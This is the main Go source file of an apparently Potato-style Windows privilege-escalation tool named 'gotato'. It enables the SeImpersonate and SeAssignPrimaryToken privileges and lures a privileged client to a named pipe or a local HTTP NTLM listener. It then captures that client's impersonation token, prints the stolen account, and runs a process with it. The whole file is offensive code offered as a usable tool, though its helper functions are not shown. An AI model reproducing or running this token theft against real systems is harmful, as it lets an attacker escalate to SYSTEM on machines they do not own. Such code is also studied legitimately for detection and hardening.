package main

import (
	"flag"
	"fmt"
	"os"
	"strconv"
)

/*
Args:
-m (http|pipe) default pipe
-p port
-n pipe name
-q exit on execution


*/

func main() {
	mode := flag.String("m", "pipe", "Mode [http|pipe]")
	pipeName := flag.String("n", "mal", "Pipe name")
	hostName := "localhost" //flag.String("H", "localhost", "HTTP hostname")
	port := flag.Int("p", 4644, "HTTP server port")
	printHelp := flag.Bool("h", false, "Print this help menu")

	flag.Parse()

	if *printHelp {
		fmt.Println("Usage: gotato -m [http|pipe] [-p PORT] [-n PIPE_NAME]") // [-H HOST_NAME]")
		flag.PrintDefaults()
		return
	}

	fmt.Println("[+] Checking privileges")

	canImpersonate := EnablePrivilege(SE_IMPERSONATE)
	canAssignPrimaryToken := EnablePrivilege(SE_ASSIGN_PRIMARY_TOKEN)
	canIncreaseQuoteName := EnablePrivilege(SE_INCREASE_QUOTE_NAME)

	fmt.Println("[+] SeImpersonate " + strconv.FormatBool(canImpersonate))
	fmt.Println("[+] SeAssignPrimaryToken " + strconv.FormatBool(canAssignPrimaryToken))
	fmt.Println("[+] SeIncreaseQuoteName " + strconv.FormatBool(canIncreaseQuoteName))

	if !canImpersonate && !canAssignPrimaryToken {
		fmt.Println("[!] Missing necessary privileges")
		return
	}

	var result NegotiatorResult
	var n ITokenNegotiator

	if *mode == "pipe" {
		n = NamedPipeNegotiator{
			Name: *pipeName,
		}
	} else {
		n = HTTPNTLMNegotiator{
			Host: hostName,
			Port: *port,
			Chan: make(chan NegotiatorResult),
		}
	}

	result = n.Serve()

	if result.Error != nil {
		fmt.Println("[!] Failed to get impersonation token: ", result.Error)
		return
	}

	localHostName, _ := os.Hostname()
	principal, _ := result.ImpersonationToken.GetTokenUser()
	sid := principal.User.Sid
	account, domain, _, _ := sid.LookupAccount(localHostName)
	fmt.Println("[+] Stole token from " + domain + "\\" + account + " (" + sid.String() + ")")

	ExecuteWithToken(*result.ImpersonationToken)
}
